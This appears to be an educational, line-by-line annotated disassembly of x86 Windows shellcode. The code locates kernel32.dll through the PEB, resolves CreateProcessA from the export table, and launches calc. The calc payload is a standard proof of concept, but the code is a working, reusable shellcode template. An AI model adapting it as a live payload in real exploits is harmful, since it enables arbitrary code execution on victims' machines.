
Section 1: Find base address of kernel32.dll

      0:  31 db                   xor    ebx,ebx                          // EBX = 0
      2:  64 8b 7b 30             mov    edi,DWORD PTR fs:[ebx+0x30]      // EDI = Pointer to PEB
      6:  8b 7f 0c                mov    edi,DWORD PTR [edi+0xc]          // EDI = Pointer to PEB_LDR_DATA
      9:  8b 7f 1c                mov    edi,DWORD PTR [edi+0x1c]         // EDI = InInitializationOrderModuleList - Pointer to List_Entry structure

      c:  8b 47 08                mov    eax,DWORD PTR [edi+0x8]          // EAX = Beginning of Loop - EAX = Base Address of the current module
      f:  8b 77 20                mov    esi,DWORD PTR [edi+0x20]         // ESI = PTR to UNICODE basename of the current module
      12: 8b 3f                   mov    edi,DWORD PTR [edi]              // EDI = Ptr to flink member // Next entry
      14: 80 7e 0c 33             cmp    BYTE PTR [esi+0xc],0x33          // Check that the 7th character of the DLL base name is 3 (Matches kernel32.dll)
      18: 75 f2                   jne    0xc                              // Jump to start of loop if not equal

      // Base Address of kernel32.dll is in EAX

Section 2: Kernel32.dll PE header

      1a: 8b 78 3c                   mov    edi,DWORD PTR [eax+0x3c]     // EDI = MZ Header (Overwritten)
      1c: 01 c7                      add    edi, eax                     // EDI = PE Header

Section 3: Kernel32.dll export directory table

      1f: 8b 57 78                mov    edx,DWORD PTR [edi+0x78]         // EDX = Export section RVA
      22: 01 c2                   add    edx,eax                          // EDX = Export section VA

Section 4: Kernel32 Name Pointers

      24: 8b 7a 20                mov    edi,DWORD PTR [edx+0x20]         // EDI = VA of Names Table
      27: 01 c7                   add    edi,eax                          // ...

Section 5: Find createProcessA

      29: 89 dd                   mov    ebp,ebx                          // EBP = EBX = 0

    loop:
      2b: 8b 34 af                mov    esi,DWORD PTR [edi+ebp*4]        // ESI = Ptr to the exported function name
      2e: 01 c6                   add    esi,eax                          // ....
      30: 45                      inc    ebp                              // Increment counter
      31: 81 3e 43 72 65 61       cmp    DWORD PTR [esi],0x61657243       // Name starts with "Crea"
      37: 75 f2                   jne    0x2b
      39: 81 7e 08 6f 63 65 73    cmp    DWORD PTR [esi+0x8],0x7365636f   // Name has oces at char 9?
      40: 75 e9                   jne    0x2b

Section 6: CreateProcessA Ordinal

      42: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]        // EDI = VA of the Ordinals table
      45: 01 c7                   add    edi,eax                         // ...
      47: 66 8b 2c 6f             mov    bp,WORD PTR [edi+ebp*2]         // BP = Ordinal number of CreateProcessA

Section 7: CreateProcessA Address

      4b: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]       // EDI = VA of the Entry Points Table
      4e: 01 c7                   add    edi,eax                        // ....
      50: 8b 7c af fc             mov    edi,DWORD PTR [edi+ebp*4-0x4]  // EDI = VA of CreateProcessA
      54: 01 c7                   add    edi,eax

Section 8: Zero Memory

      56: 89 d9                   mov    ecx,ebx                        // Useless
      58: b1 ff                   mov    cl,0xff                        // ....

    zero_loop:
      5a: 53                      push   ebx                            // ....
      5b: e2 fd                   loop   0x5a                           // ....

      5d: 68 63 61 6c 63          push   0x636c6163 // Calc
      62: 89 e2                   mov    edx,esp

Section 9: Call the function

      64: 52                      push   edx  //
      65: 52                      push   edx
      66: 53                      push   ebx
      67: 53                      push   ebx
      68: 53                      push   ebx
      69: 53                      push   ebx
      6a: 53                      push   ebx
      6b: 53                      push   ebx
      6c: 52                      push   edx
      6d: 53                      push   ebx
      6e: ff d7                   call   edi
